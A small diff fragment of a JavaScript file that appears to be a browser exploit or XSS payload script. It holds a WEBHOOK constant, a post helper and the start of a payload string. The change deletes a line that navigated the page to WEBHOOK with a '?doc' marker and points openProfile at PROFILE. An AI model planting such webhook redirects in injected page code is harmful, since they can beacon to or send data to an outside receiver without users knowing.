@@ -17,10 +17,9 @@ function post(url, data) {
 }
 
 function openProfile() {
-  document.location = WEBHOOK;
+  document.location = PROFILE;
 }
 
-document.location = WEBHOOK + "?doc";
 window.open(PROFILE, OPEN);
 
 const payload = `
